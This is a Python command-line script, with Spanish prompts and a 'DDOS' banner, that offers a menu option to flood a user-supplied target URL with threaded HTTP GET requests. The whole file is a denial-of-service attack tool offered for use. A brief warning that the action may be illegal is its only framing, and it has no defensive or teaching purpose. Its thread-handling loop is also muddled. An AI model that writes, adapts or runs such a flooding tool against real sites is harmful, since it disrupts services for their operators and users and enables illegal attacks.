#!/usr/bin/env python3

import os
import requests
import threading
import time

ROJO = '\033[91m'
VERDE = '\033[92m'
RESET = '\033[0m'  

def limpiar_pantalla():
    os.system('clear')  # Limpiar pantalla para Linux y MacOS

def mostrar_banner():
    print(ROJO + r"""
ooooooooooo.   oooooooooo.     .oooooo.    .oooooo..o
`888'   `Y8b  `888'   `Y8b   d8P'  `Y8b  d8P'    `Y8
 888      888  888      888 888      888 888      888
 888      888  888      888 888      888  `"Y8888o.  
 888     d88'  888     d88' `88b    d88' oo     .d8P 
o888bood8P'   o888bood8P'    `Y8bood8P'  8""88888P'
""" + RESET)
    print(ROJO + "              (Jesús803576) (thefsg369)" + RESET)

def mostrar_menu():
    mostrar_banner()
    print()  
    print(VERDE + "=== Menú Principal ===" + RESET)
    print(VERDE + "1. DDoS" + RESET)
    print(VERDE + "2. Salir" + RESET)
    print(VERDE + "=" * 20 + RESET)  

def enviar_solicitud(url):
    try:
        respuesta = requests.get(url, timeout=5)
        print(f"Respuesta {respuesta.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def prueba_ddos(url, num_solicitudes, hilos):
    lista_hilos = []
    for _ in range(hilos):
        hilo = threading.Thread(target=enviar_solicitud, args=(url,))
        lista_hilos.append(hilo)
        hilo.start()

    tiempo_inicio = time.time()
    for _ in range(num_solicitudes // hilos):
        for hilo in lista_hilos:
            hilo.join()  
    
            hilo = threading.Thread(target=enviar_solicitud, args=(url,))
            lista_hilos.append(hilo)
            hilo.start()

    tiempo_final = time.time()
    print(f"Tiempo total: {tiempo_final - tiempo_inicio} segundos")

def opcion_ddos():
    limpiar_pantalla()  # Limpiar la pantalla antes de mostrar la advertencia
    mostrar_banner()
    
    print()  # Espacio adicional
    print(ROJO + "ADVERTENCIA: Esta acción podría ser ilegal y tiene consecuencias serias." + RESET)

    url = input(VERDE + "Ingresa la URL objetivo: " + RESET) 
    num_solicitudes = int(input(VERDE + "Número de solicitudes: " + RESET))  
    hilos = int(input(VERDE + "Número de hilos: " + RESET))  

    confirmacion = input(VERDE + "¿Estás seguro de continuar? (s/n): " + RESET)
    if confirmacion.lower() == 's':
        limpiar_pantalla()  # Limpiar pantalla antes de ejecutar el ataque
        print(ROJO + "Ejecutando opción de DDoS..." + RESET)
        prueba_ddos(url, num_solicitudes, hilos)
    else:
        print(VERDE + "Acción cancelada." + RESET)

    input(VERDE + "Presiona 1 para volver al menú: " + RESET)

def main():
    while True:
        limpiar_pantalla()  # Limpiar la pantalla antes de mostrar el menú
        mostrar_menu()
     
        opcion = input(VERDE + "Selecciona una opción (1-2): " + RESET)

        if opcion == '1':
            limpiar_pantalla()  # Limpiar la pantalla antes de la opción DDoS
            opcion_ddos()
        elif opcion == '2':
            limpiar_pantalla()  # Limpiar pantalla antes de salir
            print(VERDE + "Saliendo..." + RESET)
            break
        else:
            print(ROJO + "Opción no válida. Por favor, intenta de nuevo." + RESET)

if __name__ == "__main__": 
    main()
